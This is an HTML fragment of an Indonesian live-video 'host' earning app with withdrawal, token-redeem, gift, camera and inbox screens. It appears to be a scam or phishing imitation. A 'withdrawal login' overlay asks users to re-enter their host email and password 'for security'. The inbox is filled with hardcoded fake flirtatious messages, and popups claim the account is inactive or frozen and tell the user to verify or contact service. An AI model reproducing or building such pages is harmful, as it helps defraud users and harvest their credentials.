    <img src="ic_checked.png" alt="icon" style="width:22px; height:22px;">
    <div>
      <b>Nomor Rekening :</b>
      <div id="viewNoRek" style="color:#333; margin-top:4px;">-</div>
    </div>
  </div>

</div>


<!-- 🔹 Tombol Google -->
<button style="
  margin-top:20px; 
  width:100%; 
  padding:14px; 
  display:flex; 
  align-items:center; 
  justify-content:space-between;
  background:#ffffff; 
  border:1px solid #ddddddc2; 
  border-radius:8px; 
  cursor:pointer;
  font-size:16px; 
  font-weight:600;
">
  <!-- Kiri: ikon + teks -->
  <div style="display:flex; align-items:center; gap:10px;">
    <img src="bind_google_icon.png" alt="icon" style="width:44px; height:44px;">
    <span>Google</span>
  </div>

  <!-- Kanan: ikon kecil -->
  <img src="delete_hashtag_icon.png" alt="icon"
       style="width:15px; height:15px; filter: invert(27%) sepia(100%) saturate(7450%) hue-rotate(358deg) brightness(95%) contrast(119%);">
</button>


<!-- 🔹 Tombol Agency -->
<button style="
  margin-top:20px; 
  width:100%; 
  padding:14px; 
  display:flex; 
  align-items:center; 
  justify-content:space-between;
  background:#ffffff; 
  border:1px solid #ddddddc2; 
  border-radius:8px; 
  cursor:pointer;
  font-size:16px; 
  font-weight:600;
">
  <!-- Kiri: ikon + teks -->
  <div style="display:flex; align-items:center; gap:10px;">
    <img src="agencylogo.png" alt="icon" style="width:44px; height:44px;">
    <span>AGENCY TIGOHOST IDN</span>
  </div>

  <!-- Kanan: ikon kecil -->
  <img src="third_acoount_bound_iocn.png" alt="icon" style="width:15px; height:15px;">
</button>


    <button id="closeBankPopup" style="
      margin-top:20px; width:100%; padding:12px;
      background:#ffffff00; color:#ffffff00; border:none; border-radius:8px;
      font-size:16px; cursor:pointer;
    ">Tutup</button>

    <button id="btnLogout" class="btn btn-muted"style="
      margin-top:20px; width:100%; padding:12px;
      background:#e31515; color:#fff; border:none; border-radius:20px;
      font-size:16px; cursor:pointer;
    " type="button"> LogOut</button>

  </div>
</div>















<!-- Menu Catatan Pembayaran -->
<div id="offlineBtn2" 
     style="display:flex; justify-content:space-between; align-items:center; padding:14px 16px; cursor:pointer; background:#fff;">
  <span style="display:flex; align-items:center; font-size:15px;">
    <img src="match_his_icon.png" alt="icon" style="width:20px; height:20px; margin-right:10px;">
    Catatan Pembayaran
  </span>
 <img src="right_arrow_gray.png" alt="arrow" style="width:18px; height:18px; opacity:0.6;">
</div>


<!-- ===== Menu Tombol Menukar ===== -->
<div id="btnRedeem" 
     style="display:flex; justify-content:space-between; align-items:center; padding:14px 16px; cursor:pointer; background:#fff;">
  <span style="display:flex; align-items:center; font-size:15px;">
    <img src="reset_rtc_icon.png" alt="icon" style="width:20px; height:20px; margin-right:10px;">
    Menukarkan
  </span>
 <img src="right_arrow_gray.png" alt="arrow" style="width:18px; height:18px; opacity:0.6;">
</div>

<!-- ===== POPUP FULLSCREEN ===== -->
<div id="redeemPopup" style="
  display:none;
  position:fixed; 
  top:0; left:0; 
  right:0; bottom:0;
  background:#fff; 
  z-index:9999; 
  overflow-y:auto;
">
  <!-- Header -->
  <div style="display:flex; align-items:center; padding:16px;">
    <img src="back_gray.png" id="closeRedeem" style="width:20px; height:20px; cursor:pointer; margin-right:10px;">
<h2 style="margin:0; font-size:16px; text-align:center;">Menukarkan</h2>
  </div>

  <!-- Saldo -->
  <div style="padding:16px; display:flex; justify-content:space-between; align-items:center;">
    <div style="display:flex; align-items:center;">
      <img src="credit.png" style="width:20px; height:20px; margin-right:8px;">
      <span style="font-size:16px; font-weight:bold;">0</span>
    </div>
    <span style="color:#888; font-size:13px;">1 Token = 1 Credits</span>
  </div>

<!-- Grid Pilihan -->
<div style="display:grid; grid-template-columns:repeat(2,1fr); gap:12px; padding:16px;">
  
  <div style="background:#fff; border:1px solid #eee; border-radius:8px; padding:20px; text-align:center;">
    <img src="token.png" style="width:40px; height:40px; margin-bottom:8px;">
    <div style="font-size:14px;">100 Tokens</div>
    <div style="display:inline-flex; align-items:center; justify-content:center;
                background:#f1f1f1;  border-radius:6px;
                padding:4px 8px; margin-top:6px;">
      <img src="credit.png" style="width:16px; height:16px; margin-right:4px;">
      <span style="font-weight:bold; color:#1e1c1f;">100</span>
    </div>
  </div>

  <div style="background:#fff; border:1px solid #eee; border-radius:8px; padding:20px; text-align:center;">
    <img src="token.png" style="width:40px; height:40px; margin-bottom:8px;">
    <div style="font-size:14px;">500 Tokens</div>
    <div style="display:inline-flex; align-items:center; justify-content:center;
                background:#f1f1f1;  border-radius:6px;
                padding:4px 8px; margin-top:6px;">
      <img src="credit.png" style="width:16px; height:16px; margin-right:4px;">
      <span style="font-weight:bold; color:#1e1c1f;">500</span>
    </div>
  </div>

    <div style="background:#fff; border:1px solid #eee; border-radius:8px; padding:20px; text-align:center;">
    <img src="token.png" style="width:40px; height:40px; margin-bottom:8px;">
    <div style="font-size:14px;">1000 Tokens</div>
    <div style="display:inline-flex; align-items:center; justify-content:center;
                background:#f1f1f1;  border-radius:6px;
                padding:4px 8px; margin-top:6px;">
      <img src="credit.png" style="width:16px; height:16px; margin-right:4px;">
      <span style="font-weight:bold; color:#1e1c1f;">1000</span>
    </div>
  </div>

    <div style="background:#fff; border:1px solid #eee; border-radius:8px; padding:20px; text-align:center;">
    <img src="token.png" style="width:40px; height:40px; margin-bottom:8px;">
    <div style="font-size:14px;">5000 Tokens</div>
    <div style="display:inline-flex; align-items:center; justify-content:center;
                background:#f1f1f1;  border-radius:6px;
                padding:4px 8px; margin-top:6px;">
      <img src="credit.png" style="width:16px; height:16px; margin-right:4px;">
      <span style="font-weight:bold; color:#1e1c1f;">5000</span>
    </div>
  </div>


    <div style="background:#fff; border:1px solid #eee; border-radius:8px; padding:20px; text-align:center;">
    <img src="token.png" style="width:40px; height:40px; margin-bottom:8px;">
    <div style="font-size:14px;">8000 Tokens</div>
    <div style="display:inline-flex; align-items:center; justify-content:center;
                background:#f1f1f1;  border-radius:6px;
                padding:4px 8px; margin-top:6px;">
      <img src="credit.png" style="width:16px; height:16px; margin-right:4px;">
      <span style="font-weight:bold; color:#1e1c1f;">8000</span>
    </div>
  </div>


    <div style="background:#fff; border:1px solid #eee; border-radius:8px; padding:20px; text-align:center;">
    <img src="token.png" style="width:40px; height:40px; margin-bottom:8px;">
    <div style="font-size:14px;">10000 Tokens</div>
    <div style="display:inline-flex; align-items:center; justify-content:center;
                background:#f1f1f1;  border-radius:6px;
                padding:4px 8px; margin-top:6px;">
      <img src="credit.png" style="width:16px; height:16px; margin-right:4px;">
      <span style="font-weight:bold; color:#1e1c1f;">10000</span>
    </div>
  </div>
  <!-- Tambah paket lain sesuai kebutuhan -->

</div>


  <!-- Tombol Menukarkan -->
  <div style="padding:16px;">
    <button style="width:100%; padding:12px; background:#ccc; color:#fff; border:none; border-radius:20px; font-size:15px;">
      Menukarkan
    </button>
  </div>
</div>




</div>

<!-- Instruksi -->
<div style="margin-top:20px;">
  <h3 style="font-size:15px; margin-bottom:8px; color:#000;">instruksi</h3>
  <ol style="padding-left:20px; font-size:14px; line-height:1.6; color:#333;">
    <li>Akun dengan 2000+ Credits dapat diuangkan.</li>
    <li>Jumlah penarikan akan bervariasi sesuai dengan nilai tukar.</li>
    <li>Permintaan akan ditangani dalam 2 hari kerja.</li>
    <li>Jika Anda memiliki pertanyaan, silahkan hubungi kami.</li>
  </ol>
</div>


      


















<!-- ✅ Overlay + Login Card -->
<div id="loginOverlay" style="
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  display: flex;
  align-items: center;
  justify-content: center;
  z-index: 9999;
  overflow: hidden;
">
  <!-- ✅ Login card -->
  <div id="loginCard" class="login-card" style="
    background: #fff;
    padding: 20px;
    border-radius: 12px;
    width: 300px;
    box-shadow: 0 4px 12px rgba(0,0,0,0.2);
    position: relative;
    z-index: 2; /* pastikan di atas background */
  ">
    <div style="display:flex;gap:8px;align-items:center;margin-bottom:10px">
      <div style="width:44px; height:44px; border-radius:10px; overflow:hidden; background:var(--soft); display:flex; align-items:center; justify-content:center;">
        <img src="servant_icon.png" alt="Offline" style="width:100%; height:100%; object-fit:cover;" />
      </div>
      <div>
        <div style="font-weight:700">LOGIN PENARIKAN</div>
        <div style="font-size:12px;color:#888">Demi keamanan, harap masukan akun host anda kembali!</div>
      </div>
    </div>

    <label style="font-size:14px; font-weight:600;">Email</label>
    <input id="loginEmail" type="text" placeholder="email@example.com" 
      style="font-size:14px; width:100%; padding:10px 12px; margin-bottom:12px; border:1px solid #ccc; border-radius:8px;" />

    <label style="font-size:14px; font-weight:600;">Password</label>
    <input id="loginWA" type="text" placeholder="xxxx(ops!)" 
      style="font-size:14px; width:100%; padding:10px 12px; border:1px solid #ccc; border-radius:8px;" />

    <div style="margin-top:12px;display:flex;gap:8px; justify-content:flex-end;">
      <button id="btnLogin" class="btn btn-primary">Masuk</button>
    </div>
  </div>
</div>

    <!-- Action (deposit) -->
    <div id="actionCard" class="action-card" style="display:none">
      <div style="justify-content:space-between;align-items:center;margin-bottom:130px">
        <div>











<!-- Popup kamera -->
<div id="cameraPopup" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:#000; z-index:9999;">
  <!-- Header -->



 <!-- BOX SALDO DI POPUP -->
  <div class="saldo-box" style="position:absolute; top:10px; left:10px; background:#73229c; border-radius:10px; padding:6px 12px; display:flex; align-items:center; ">
    <img src="score_icon_wrap.png" alt="icon" style="width:20px; height:20px; margin-right:6px;">
    <span id="saldoHostPopup" style="color:white;"> 0</span>

  </div>




<!-- Tombol Gift -->
  <!-- Tombol Gift -->
  <img id="giftBtn" src="im_gift_select.png" alt="gift"
    style="position:absolute; top:10px; right:10px; width:40px; height:40px; cursor:pointer;">


<!-- Popup Gift -->
  <!-- Popup Gift -->
  <div id="giftPopup" style="
    display:none;
    position:absolute;
    top:60px; right:10px;
    background-image:url('no_match_times_top_bg.png');
    background-size:100% 100%;
    background-repeat:no-repeat;
    padding:10px;
    border-radius:8px;
    z-index:1000;
  ">
    <img src="gift_103.png" class="giftOption" data-points="10" style="width:40px; margin:5px; cursor:pointer;">
    <img src="gift_14.png" class="giftOption" data-points="20" style="width:40px; margin:5px; cursor:pointer;">
    <img src="gift_35.png" class="giftOption" data-points="30" style="width:40px; margin:5px; cursor:pointer;">
    <img src="giftkiss.png" class="giftOption" data-points="50" style="width:40px; margin:5px; cursor:pointer;">
    <img src="giftbear.png" class="giftOption" data-points="230" style="width:40px; margin:5px; cursor:pointer;">
    <img src="gift_96.png" class="giftOption" data-points="125" style="width:40px; margin:5px; cursor:pointer;">
    <img src="gift_77.png" class="giftOption" data-points="135" style="width:40px; margin:5px; cursor:pointer;">
    <img src="gift_59.png" class="giftOption" data-points="140" style="width:40px; margin:5px; cursor:pointer;">
    <img src="gift_58.png" class="giftOption" data-points="170" style="width:40px; margin:5px; cursor:pointer;">
    <img src="gift_59.png" class="giftOption" data-points="100" style="width:40px; margin:5px; cursor:pointer;">
    <img src="giftlambor.png" class="giftOption" data-points="600" style="width:40px; margin:5px; cursor:pointer;">
    <img src="giftring.png" class="giftOption" data-points="200" style="width:40px; margin:5px; cursor:pointer;">
    <img src="gift.png" class="giftOption" data-points="5" style="width:40px; margin:5px; cursor:pointer;">
    <img src="gift2.png" class="giftOption" data-points="212" style="width:40px; margin:5px; cursor:pointer;">
    <img src="gift3.png" class="giftOption" data-points="118" style="width:40px; margin:5px; cursor:pointer;">
    <img src="gift4.png" class="giftOption" data-points="325" style="width:40px; margin:5px; cursor:pointer;">
    <img src="gift5.png" class="giftOption" data-points="310" style="width:40px; margin:5px; cursor:pointer;">
    <img src="gift_61.png" class="giftOption" data-points="90" style="width:40px; margin:5px; cursor:pointer;">
  </div>










  <!-- Video -->
  <video id="customCameraVideo" playsinline style="width:100%; height:100%; object-fit:cover;"></video>

  <!-- Loading -->
  <div id="loadingOverlay" style="position:absolute; top:50%; left:50%; transform:translate(-50%, -50%); text-align:center; color:white;">
    <div style="border:6px solid #f3f3f3; border-top:6px solid #3498db; border-radius:50%; width:50px; height:50px; animation:spin 1s linear infinite; margin:auto;"></div>
    <p style="margin-top:10px;">Sedang mencari lawan...</p>
  </div>

<!-- Chat Box -->
<!-- Chat Box -->
  <div id="chatBox" style="
    position:absolute;
    bottom:190px;
    left:10px;
    width:60%;
    max-height:200px;
    background:rgba(0,0,0,0.6);
    border-radius:8px;
    padding:10px;
    overflow-y:auto;
    color:white;
    font-size:14px;
  ">
  <!-- Pesan & gift muncul di sini -->
</div>
<!-- Input + Tombol Kirim -->
  <!-- Input + Tombol Kirim -->
  <div style="position:absolute; bottom:160px; left:10px; width:60%; display:flex; gap:6px;">
    <input id="chatInput" type="text" placeholder="Ketik pesan..." 
      style="flex:1; padding:6px 8px; border-radius:6px; border:none; outline:none;">
    <button id="chatSendBtn" style="
      background:#007bff; 
      color:white; 
      border:none; 
      padding:6px 12px; 
      border-radius:6px;
      cursor:pointer;
    ">Kirim</button>
  </div>








  <!-- Tombol -->
  <button id="skipBtn" style="position:absolute; color: #fff; bottom:100px; left:20px; border-radius:20px; background:#73229c; padding:10px 20px;">Skip</button>
  <button id="closeCameraBtn" style="position:absolute; color: #fff; bottom:100px; border-radius: 20px; right:20px; background: #73229c; padding:10px 20px;">Tutup</button>

<!-- Popup pesan -->
<!-- Popup pesan -->
<div id="inactivePopup" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0, 0, 0, 0.8); color:white; display:flex; justify-content:center; align-items:center; z-index:10000;">
  <div style="background:#ffffff; padding:20px; border-radius:12px; text-align:center; max-width:80%; box-shadow:0 4px 12px rgba(0,0,0,0.4);">
    
    <!-- Logo di tengah -->
    <img src="cert_failed_similar_user.png" alt="Logo" style="width:70px; height:70px; margin-bottom:15px; display:block; margin-left:auto; margin-right:auto;">
    
    <!-- Pesan -->
    <p style="color:#000; font-size:16px; line-height:1.5; margin-bottom:20px;">
      Video dijeda,<br>
      akun anda belum aktif.<br>
      <b>Mohon aktifkan terlebih dahulu</b>
    </p>

    <!-- Tombol OK -->
    <button onclick="document.getElementById('inactivePopup').style.display='none'" 
      style="background:#420785; color:white; border:none; padding:10px 24px; border-radius:6px; font-size:15px; cursor:pointer; font-weight:bold; transition:0.2s;">
      OK
    </button>
  </div>
</div>





</div>









<!-- 🔹 Popup Riwayat -->
<div id="historyPopup" class="history-popup" role="dialog" aria-hidden="true">
  <div class="history-panel" style="max-width:480px; margin:0 auto;">

    <!-- 🔹 Header -->
    <div class="history-top" style="background:#f7f7f7; display:flex; align-items:center; padding:10px; border-bottom:1px solid #eee;">
      
      <!-- Tombol kembali -->
      <button id="closePopup" style="background:none; border:none; padding:0; cursor:pointer; margin-right:10px;">
        <img src="back_black.png" alt="Kembali" style="width:22px; height:22px;">
      </button>

      <!-- Teks tengah -->
      <div style="flex:1;">
        <div class="history-title" id="historyHeader" style="font-size:14px; color:#838383; font-weight:600;">9/2025</div>
        <div class="month-row" id="historyTotal" style="font-size:13px; color:#666;">Total: $0.00</div>
      </div>

      <!-- Tombol filter -->
      <button id="filterBtn" style="background:none; border:none; padding:0; cursor:pointer;">
        <img src="task_icon.png" alt="Filter" 
     style="width:28px;height:28px;filter:invert(35%) sepia(85%) saturate(500%) hue-rotate(189deg);">
      </button>
    </div>

    <!-- 🔹 List transaksi -->
    <div class="tx-list" id="txList" style="padding:0;">
      <!-- Contoh item -->
      <div class="tx-item" style="display:flex; justify-content:space-between; padding:12px 14px; border-bottom:1px solid #f5f5f5;">
        <div class="tx-left">
          <div class="tx-main" style="font-size:14px; color:#000;">Loading!</div>
          <div class="tx-sub" style="font-size:12px; color:#888;">9/8 19:47:56</div>
        </div>
        <div class="tx-amount" style="font-size:12px; color:#333; font-weight:500;">Rp 0</div>
      </div>
    </div>
  </div>
</div>











<!-- NAVIGASI BAWAH (selalu tampil) -->
<div id="bottomNav">
  <!-- Play -->
  <div class="nav-item" onclick="setActiveNav(this); openPlayPopup()">
    <img class="nav-icon" 
         src="destiny_icon_normal.png" 
         data-default="destiny_icon_normal.png" 
         data-active="destiny_icon_selected.png" 
         alt="Play"><br>
    <small></small>
  </div>

  <!-- Dunia -->
  <div class="nav-item" onclick="setActiveNav(this); openDuniaPopup()">
    <img class="nav-icon" 
         src="match_icon_normal.png" 
         data-default="match_icon_normal.png" 
         data-active="match_icon_selected.png" 
         alt="Dunia"><br>
    <small></small>
  </div>

  <!-- Inboxxxx -->
  <div class="nav-item" onclick="setActiveNav(this); openInboxxxxPopup()">
    <img class="nav-icon" 
         src="msg_icon_normal.png" 
         data-default="msg_icon_normal.png" 
         data-active="msg_icon_selected.png" 
         alt="Inboxxxx" style="width:38px;"><br>
    <small></small>
  </div>

  <!-- Saya -->
  <div class="nav-item" onclick="setActiveNav(this); showPageNav('saya')">
    <img class="nav-icon" 
         src="mine_icon_normal.png" 
         data-default="mine_icon_normal.png" 
         data-active="mine_icon_selected.png" 
         alt="Saya"><br>
    <small></small>
  </div>
</div>


<!-- POPUP CUSTOM -->
<div id="frozenPopup" style="display:none;
     position:fixed;top:0;left:0;width:100%;height:100%;
     background:#fff;z-index:999;
     justify-content:center;align-items:center;">
  <div style="background:#fff;padding:20px;border-radius:12px;
              max-width:300px;text-align:center;position:relative;
              box-shadow:0 4px 10px rgba(0,0,0,0.3);">
    <span id="closePopupplik" 
          style="position:absolute;right:10px;top:5px;font-size:20px;cursor:pointer;">&times;</span>
    <img src="cert_failed_similar_user.png" alt="Offline" style="width:80px;margin-bottom:15px;">
    <p style="margin:0;">Halaman sedang dibekukan sementara!<br>Mohon hubungi layanan.</p>
  </div>
</div>

<!-- POPUP DUNIA -->
<div id="duniaPopup" class="popup-overlay" style="
    display:none; 
    position:fixed; 
    top:0; 
    left:0; 
    width:100%; 
    height:100%; 
    background:rgba(0,0,0,0.5); 
    justify-content:center; 
    align-items:center;
    z-index:999;">
  <div class="popup-box" style="
      background:#ffffff; 
      border-radius:12px; 
      padding:20px; 
      width:100%; height:100%; 
      max-width:none; 
      display:flex; 
      flex-direction:column; 
      position:relative;
      align-items:center;
      justify-content:center;
  ">

    <!-- HEADER SALDO -->
    <div class="saldo-header" style="
      position:absolute; 
      top:40px; 
      left:20px; right:20px;
      background:#ffffff;
      padding:6px 12px; 
      border-radius:12px; 
      font-weight:bold; 
      display:flex;
      align-items:center;
      justify-content:space-between;
      color:#890086;">
      <div style="display:flex; align-items:center;">
        <img src="score_icon_wrap.png" alt="icon" 
             style="width:20px; height:20px; margin-right:6px;">
        <span id="saldoHostPopup3" class="saldo-text">Rp 0</span>
      </div>
      <!-- Icon history -->
      <img id="openHistoryBtn" src="match_his_icon.png" alt="hispanggilll" style="width:22px; cursor:pointer;">
    </div>

    <!-- POPUP HISTORY -->
    <div id="hispanggilll" style="
      display:none; 
      position:fixed; 
      top:0; 
      left:0; 
      width:100%; 
      height:100%; 
      background:#fff; 
      justify-content:center; 
      align-items:center;
      z-index:1000;">
      <div style="background:#fff; border-radius:12px; padding:20px; max-width:400px; width:90%; text-align:center; position:relative;">
        <span class="closePanggilan" style="position:absolute; top:10px; right:15px; font-size:20px; color:#686868; cursor:pointer;">✖</span>
        <img src="page_empty_icon.png" style="max-width:60px; height:60px;">
        <p style="margin-top:10px; color:#212121; font-weight:bold;">Tidak ada history panggilan</p>
      </div>






    </div>



      
<!-- Scroll Foto Profil Otomatis -->
<!-- Scroll Foto Profil Otomatis -->
<div id="carouselContainer" style="
    position:relative;
    width:100%;
    max-width:600px;
    margin:50px auto;
    overflow:hidden;
    display:flex;
    justify-content:center;
    align-items:center;
    background: url('global_map.png') no-repeat center center;
    background-size: contain; /* ukuran pas dengan container */
">
    <div id="carouselTrack" style="
        display:flex;
        transition: transform 5.90s;
        gap:0px;
    ">
        <div class="carousel-item"><img src="cewek10.jpeg"></div>
        <div class="carousel-item"><img src="cewek11.jpeg"></div>
        <div class="carousel-item"><img src="cewek12.jpg"></div>
        <div class="carousel-item"><img src="cewek13.jpeg"></div>
        <div class="carousel-item"><img src="cewek15.jpeg"></div>
        <div class="carousel-item"><img src="cewek16.jpeg"></div>
        <div class="carousel-item"><img src="cewek20.jpg"></div>
        <div class="carousel-item"><img src="cewek21.jpeg"></div>
        <div class="carousel-item"><img src="cewek22.jpeg"></div>
        <div class="carousel-item"><img src="cewek23.jpeg"></div>
        <div class="carousel-item"><img src="cewek24.jpeg"></div>
        <div class="carousel-item"><img src="cewek25.jpeg"></div>
        <div class="carousel-item"><img src="cewek26.jpg"></div>
        <div class="carousel-item"><img src="cewek27.jpeg"></div>
        <div class="carousel-item"><img src="cewek28.jpeg"></div>
        <div class="carousel-item"><img src="cewek29.jpeg"></div>
        <div class="carousel-item"><img src="cewek30.jpeg"></div>
        <div class="carousel-item"><img src="cewek31.jpeg"></div>
        <div class="carousel-item"><img src="cewek23.jpeg"></div>
        <div class="carousel-item"><img src="cewek12.jpg"></div>
        <div class="carousel-item"><img src="cewek10.jpeg"></div>
        <div class="carousel-item"><img src="cewek11.jpeg"></div>
        <div class="carousel-item"><img src="cewek12.jpg"></div>
        <div class="carousel-item"><img src="cewek13.jpeg"></div>
        <div class="carousel-item"><img src="cewek15.jpeg"></div>
        <div class="carousel-item"><img src="cewek16.jpeg"></div>
        <div class="carousel-item"><img src="cewek20.jpg"></div>
        <div class="carousel-item"><img src="cewek21.jpeg"></div>
        <div class="carousel-item"><img src="cewek22.jpeg"></div>
        <div class="carousel-item"><img src="cewek23.jpeg"></div>
        <div class="carousel-item"><img src="cewek24.jpeg"></div>
        <div class="carousel-item"><img src="cewek25.jpeg"></div>
        <div class="carousel-item"><img src="cewek26.jpg"></div>
        <div class="carousel-item"><img src="cewek27.jpeg"></div>
        <div class="carousel-item"><img src="cewek28.jpeg"></div>
        <div class="carousel-item"><img src="cewek29.jpeg"></div>
        <div class="carousel-item"><img src="cewek30.jpeg"></div>
        <div class="carousel-item"><img src="cewek31.jpeg"></div>
        <div class="carousel-item"><img src="cewek23.jpeg"></div>
        <div class="carousel-item"><img src="cewek33.jpeg"></div>
        
        
    </div>
</div>


    <!-- Tombol Awal -->
    <div style="margin-top:60px; text-align:center;"> <!-- lebih banyak jarak ke bawah -->
      <button id="openCameraBtn2" style="
        background:#6c27b0; 
        color:#fff; 
        border:none; 
        padding:12px 60px; 
        border-radius:30px; 
        font-size:16px; 
        font-weight:bold; 
        cursor:pointer;
      ">
        Awal
      </button>
    </div>

  </div>
</div>










<!-- PLAY POPUP -->
<div id="playPopup" style="display:none;
     position:fixed;top:0;left:0;width:100%;height:100%;
     background:rgb(255, 255, 255);z-index:999;
     justify-content:center;align-items:center;">
  <div style="background:#fff;padding:20px;border-radius:12px;
              max-width:300px;text-align:center;position:relative;">
    <img src="cert_failed_similar_user.png" alt="Play" style="width:80px;margin-bottom:15px;">
    <p style="margin:0;"><b>Menu ini belum bisa di akses<p></b>Silakan Vrifikasi Terlebih Dahulu!</p>
  </div>
</div>








<!-- 🔹 POPUP INBOX FULL -->
<div id="inboooxxxxxx" class="boxinbox" style="
  display:none;
  position: fixed;
  top:0;
   left:0;
  width:100%; height:100%;
  background:#fff;
  z-index:999;
  overflow-y:auto;
">
  <!-- Header -->
<div style="position:fixed; top:0; left:0; width:95%; background:#fff; padding:15px; 
            display:flex; justify-content:space-between; 
            align-items:center; z-index:10000;">

  <!-- Tabs Pesan & Panggilan -->
  <div style="display:flex; gap:15px; font-size:16px;">
    <span style="font-weight:bold; color:#000;">Pesan</span>
<span id="openCallsPopup" style="color:#999; cursor:pointer;">Panggilan</span>
  </div>





  <!-- Icon kanan -->
  <!-- Icon kanan -->
<div style="display:flex; align-items:center; gap:15px;">
  
  <!-- Ikon User dengan Badge -->
<!-- === Ganti atau tambahkan id ini pada elemen trigger-mu === -->
<div id="friendsBtn" style="position:relative; font-size:20px; cursor:pointer;">
  <img src="msg_icon_friend.png" alt="Friends" style="width:24px; height:24px;">
  <span style="position:absolute; top:-5px; right:-8px; background:red; color:white;
               font-size:12px; padding:2px 6px; border-radius:50%;">0</span>
</div>
<!-- === POPUP FULLSCREEN (menutupi nav + header) === -->
<div id="friendsPopup" style="
  display:none;
  position:fixed; top:0; left:0;
  width:100%; height:100%;
  background:#fff;
  z-index:100000;
  font-family:sans-serif;
  flex-direction:column;
">
  <!-- Header -->
  <div style="display:flex; align-items:center; justify-content:space-between;
              padding:12px 15px; ">
    <img id="friendsBackBtn" src="back_gray.png" alt="Back" style="width:22px; height:22px; cursor:pointer;">
    <span style="font-weight:bold;">Permintaan</span>
    <div style="width:22px;"></div>
  </div>

  <!-- Tabs dengan border-bottom -->
<div style="display:flex; gap:0; margin: 40px;">
  <div id="friendsTabTeman" data-tab="teman" style="
    flex:1; 
    text-align:center; 
    padding:12px; 
    border-radius: 20px;
    cursor:pointer; 
    border-bottom:3px solid 3px solid rgb(167 167 167);
    border-right:1px solid #ddd;
  ">Teman</div>

  <div id="friendsTabPermintaan" data-tab="permintaan" style="
    flex:1; 
    text-align:center; 
    padding:12px; 
    border-radius: 20px;
    cursor:pointer; 
    border-bottom:3px solid 3px solid rgb(167 167 167);
    border-bottom:3px solid transparent;
  ">Permintaan</div>
</div>


  <!-- Konten -->
  <div id="friendsTabContent" style="
    flex:1;
    display:flex;
    align-items:center;
    justify-content:center;
    color:#666;
    font-size:15px;
  ">
    Belum ada teman
  </div>
</div>




<!-- Popup -->
<div id="callsPopup">
  <div id="callsPopupContent">
    
    <!-- Header Popup -->
    <div class="popup-header">
      <img id="backCallsPopup" src="back_gray.png" alt="Back">
      <span>Panggilan</span>
    </div>

    <!-- Isi konten -->
    <div class="popup-body">
      <img src="page_empty_icon.png" alt="Gambar Panggilan">
      <p>Belum ada riwayat panggilan</p>
    </div>

  </div>
</div>











  <!-- Menu titik tiga jadi gambar -->
<div style="cursor:pointer;" onclick="openMenuPopup()">
  <img src="msg_icon_more_dot.png" alt="Menu" style="width:22px; height:22px;">
</div>

</div>
</div>

  <!-- Isi daftar chat -->
  <div id="pageChat" style="margin-top:70px; padding:1px;">

  <div class="chat-item laporan" onclick="openChat('chatLayananHost', this)" 
     style="display:flex; align-items:center; gap:10px;">
  
  <div class="chat-avatar" style="
      width: 40px; 
      height: 40px; 
      -webkit-mask: url('servant_icon.png') no-repeat center;
      -webkit-mask-size: contain;
      mask: url('servant_icon.png') no-repeat center;
      mask-size: contain;
      background-image: url('servant_icon.png'); 
      background-size: cover;
      background-position: center;
  "></div>

  <div class="chat-info">
    <h4>Layanan Pelanggan</h4>
    <p id="lastMessage"></p>
  </div>
</div>

      <!-- Tempat isi chat -->
    
    </div>

    <!-- Notifikasi -->
    <div class="chat-item" onclick="openChat('pengunjung')">
      <img src="message_see_me_item_icon.png" alt="Pengunjung" class="chat-avatar">
      <div class="chat-info">
        <h4>Notifikasi</h4>
        <p>Amelia mici mengunjungi saya 19 kali</p>
      </div>
      <span class="notifi-badge">63</span>
    </div>

    <div class="chat-item" onclick="openChat('pengumuman')">
      <img src="notifikasi.png" alt="Pengumuman" class="chat-avatar">
      <div class="chat-info">
        <h4>Notifikasi</h4>
        <p>Sisilaaa461 telah mengikuti anda, dan and...</p>
      </div>
      
      <span class="chat-time">--:--</span>
    </div>

    <!-- Chat User 1 -->
   <!-- Chat User 1 (tetap ada, tidak dihapus) -->
<div id="chatList">



  <div class="chat-item" onclick="openChat('user1')" data-chat-id="user1">
    <img src="cewek42.jpeg" alt="User" class="chat-avatar">
    <div class="chat-info">
      <h4>Chika <span class="host-badge">HOST</span></h4>
      <p>abanggg?</p>
    </div>
    <span class="chat-time">18:45</span>
    <span class="badge-new">6</span>
  </div>


  <div class="chat-item" onclick="openChat('user1')" data-chat-id="user1">
    <img src="cewek41.jpeg" alt="User" class="chat-avatar">
    <div class="chat-info">
      <h4>Yulia <span class="host-badge">HOST</span></h4>
      <p>baru jadi agency y ?</p>
    </div>
    <span class="chat-time">18:40</span>
    <span class="badge-new">1</span>
  </div>
  
  <div class="chat-item" onclick="openChat('user1')" data-chat-id="user1">
    <img src="cewek40.jpeg" alt="User" class="chat-avatar">
    <div class="chat-info">
      <h4>tamora <span class="host-badge">HOST</span></h4>
      <p>kamu sudah target,bantu saya dong beb</p>
    </div>
    <span class="chat-time">09:45</span>
    <span class="badge-new">3</span>
  </div>

  <div class="chat-item" onclick="openChat('user2')" data-chat-id="user2">
    <img src="cewek39.jpeg" alt="User" class="chat-avatar">
    <div class="chat-info">
      <h4>naila</h4>
      <p>p</p>
    </div>
    <span class="chat-time">09:43</span>
    <span class="badge-new">2</span>
  </div>

  <div class="chat-item" onclick="openChat('user3')" data-chat-id="user3">
    <img src="cewek38.jpeg" alt="User" class="chat-avatar">
    <div class="chat-info">
      <h4>salma nisa</h4>
      <p>abng host baru ya🥰</p>
    </div>
    <span class="chat-time">09:42</span>
    <span class="badge-new">1</span>
  </div>

  <div class="chat-item" onclick="openChat('user4')" data-chat-id="user4">
    <img src="cewek33.jpeg" alt="User" class="chat-avatar">
    <div class="chat-info">
      <h4>Amelia</h4>
      <p>sombong ya beb</p>
    </div>
    <span class="chat-time">09:40</span>
    <span class="badge-new">5</span>
  </div>

  <div class="chat-item" onclick="openChat('user5')" data-chat-id="user5">
    <img src="cewek37.jpeg" alt="User" class="chat-avatar">
    <div class="chat-info">
      <h4>Vika imuettt <span class="host-badge">HOST</span></h4>
      <p>hi vc yuk,kita kejar jam tayang</p>
    </div>
    <span class="chat-time">23:00</span>
  </div>

  <div class="chat-item" onclick="openChat('user6')" data-chat-id="user6">
    <img src="cewek23.jpeg" alt="User" class="chat-avatar">
    <div class="chat-info">
      <h4>Sintya Pratiwi <span class="host-badge">HOST</span></h4>
      <p>abg host baru ya,kok gabisa di vc bg</p>
    </div>
    <span class="chat-time">09:40</span>
    <!-- Tidak ada badge -->
  </div>
</div>



